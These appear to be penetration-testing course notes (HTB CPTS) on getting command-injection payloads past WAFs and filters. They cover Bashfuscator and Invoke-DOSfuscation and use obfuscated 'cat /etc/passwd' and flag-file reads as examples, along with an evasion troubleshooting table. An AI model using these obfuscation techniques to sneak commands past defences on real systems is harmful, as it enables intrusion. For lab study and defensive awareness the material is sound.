üß† Summary: Command Evasion Tools
When basic obfuscation (quotes, IFS, string building) doesn‚Äôt cut it ‚Äî usually due to WAFs, layered filters, or advanced parsing ‚Äî you turn to automated evasion tools to auto-obfuscate payloads.

These tools generate massive or mangled versions of a payload that still run correctly but are hard to detect.

üõ†Ô∏è Tools Covered
Tool	Platform	Purpose
Bashfuscator	Linux	Obfuscates bash commands
DOSfuscation	Windows	Obfuscates CMD/PowerShell commands
üîß Bashfuscator (Linux)
‚û§ Setup:
bash
Copy
Edit
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
‚û§ Usage:
bash
Copy
Edit
cd ./bashfuscator/bin
./bashfuscator -c 'cat /etc/passwd'
üîÅ This will default to random obfuscation layers, possibly massive output (even millions of chars).

‚û§ Refined usage (shorter):
bash
Copy
Edit
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
‚û§ Result:
Produces obfuscated eval-style code like:

bash
Copy
Edit
eval "$(W0=(w \  t e c p s a \/ d);for Ll in ...;{ printf %s "${W0[$Ll]}";};)"
‚û°Ô∏è Then test with:

bash
Copy
Edit
bash -c '<outputted_command>'
üß™ Test in Burp:
Replace spaces if needed

If blocked, assume character-level filters are hitting you again ‚Äî combine this with char obfuscation techniques (IFS, base64, etc.)

ü™ü DOSfuscation (Windows)
‚û§ Setup:
powershell
Copy
Edit
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
‚û§ Usage (Interactive):
powershell
Copy
Edit
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
‚û§ Output:
powershell
Copy
Edit
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:...etc
That looks like absolute soup, but it works, because Windows will resolve those environment variables and substring operators correctly.

‚úÖ Test in:

powershell
Copy
Edit
CMD, PowerShell, or pwsh (on Linux)
üí£ ITTTT: ‚ÄúIf This, Then Try That‚Äù Flow
Got This	Do That
Basic obfuscation fails	Use Bashfuscator or DOSfuscation
Output too large from Bashfuscator	Use --no-mangling --layers 1 -s 1 -t 1
Obfuscated command fails in Burp	Replace with ${IFS} or %09
Still blocked?	Try char/word obfuscation inside Bashfuscator manually
Can‚Äôt run DOSfuscation (no Windows)	Use pwsh on Kali or Pwnbox
Need complete stealth from WAF	Encode with base64/hex, decode inside command
üîç Patterns & Tips
These tools don't guess what's allowed ‚Äî you still need to adapt output. Combine with manual tricks if needed.

Layered encoding (e.g., base64 + eval) = heavy-duty evasion.

Keep an eye on eval, echo, printf, rev, <<<, etc. in output ‚Äî you'll recognize the obfuscation style after a few runs.

In CPTS, you‚Äôll likely use this only when basic + mid-level bypasses fail. Don‚Äôt jump straight to it unless you‚Äôre blocked hard.
